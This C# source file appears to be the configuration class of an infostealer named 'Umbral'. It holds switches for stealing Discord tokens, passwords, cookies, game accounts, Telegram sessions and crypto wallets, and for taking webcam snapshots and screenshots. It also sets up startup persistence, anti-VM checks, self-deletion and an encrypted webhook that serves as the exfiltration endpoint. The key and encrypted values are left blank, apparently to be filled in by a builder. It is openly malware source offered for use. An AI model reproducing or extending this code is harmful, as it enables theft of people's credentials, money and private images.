using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using Umbral.payload.Components.Algorithms;

namespace Umbral.payload
{
    internal static class Settings
    {
        internal static string Webhook { get; private set; }
        internal static string Version { get; private set; }
        internal static string Mutex { get; private set; }
        internal static bool Ping { get; private set; }
        internal static bool Startup { get; private set; }
        internal static bool AntiVm { get; private set; }
        internal static bool Melt { get; private set; }
        internal static bool BlockAvSites { get; private set; }

        internal static bool StealDiscordTokens { get; private set; }
        internal static bool StealPasswords { get; private set; }
        internal static bool StealCookies { get; private set; }
        internal static bool StealGames { get; private set; }
        internal static bool StealTelegramSessions { get; private set; }
        internal static bool StealSystemInfo { get; private set; }
        internal static bool StealWallets { get; private set; }

        internal static bool TakeWebcamSnapshot { get; private set; }
        internal static bool TakeScreenshot { get; private set; }

        static Settings()
        {
            var key = "";
            var iv = "";

            var encryptedWebhook = "";
            var encryptedVersion = "";
            var encryptedMutex = "";
            var ping = true;
            var startup = true;
            var antiVm = true;
            var melt = true;
            var blockAvSites = false;

            var stealDiscordToken = true;
            var stealPasswords = true;
            var stealCookies = true;
            var stealGames = true;
            var stealTelegramSessions = true;
            var stealSystemInfo = true;
            var stealWallets = true;

            var takeWebcamSnapshot = true;
            var takeScreenshot = true;

            // ---------------- Initialise variables ----------------

            Webhook = Decrypt(Convert.FromBase64String(encryptedWebhook), Convert.FromBase64String(key), Convert.FromBase64String(iv));
            Version = Decrypt(Convert.FromBase64String(encryptedVersion), Convert.FromBase64String(key), Convert.FromBase64String(iv));
            Mutex = Decrypt(Convert.FromBase64String(encryptedMutex), Convert.FromBase64String(key), Convert.FromBase64String(iv));
            Ping = ping;
            Startup = startup;
            AntiVm = antiVm;
            Melt = melt;
            BlockAvSites = blockAvSites;

            StealDiscordTokens = stealDiscordToken;
            StealPasswords = stealPasswords;
            StealCookies = stealCookies;
            StealGames = stealGames;
            StealTelegramSessions = stealTelegramSessions;
            StealSystemInfo = stealSystemInfo;
            StealWallets = stealWallets;

            TakeWebcamSnapshot = takeWebcamSnapshot;
            TakeScreenshot = takeScreenshot;
        }

        static string Decrypt(byte[] encryptedData, byte[] key, byte[] iv)
        {

            var cipherText = encryptedData.Take(encryptedData.Length - 16).ToArray();
            var tag = encryptedData.Skip(encryptedData.Length - 16).ToArray();

            var aesgcm = new AesGcm();
            var decrypted = aesgcm.Decrypt(key, iv, null, cipherText, tag);

            return Encoding.UTF8.GetString(decrypted);
        }
    }
}
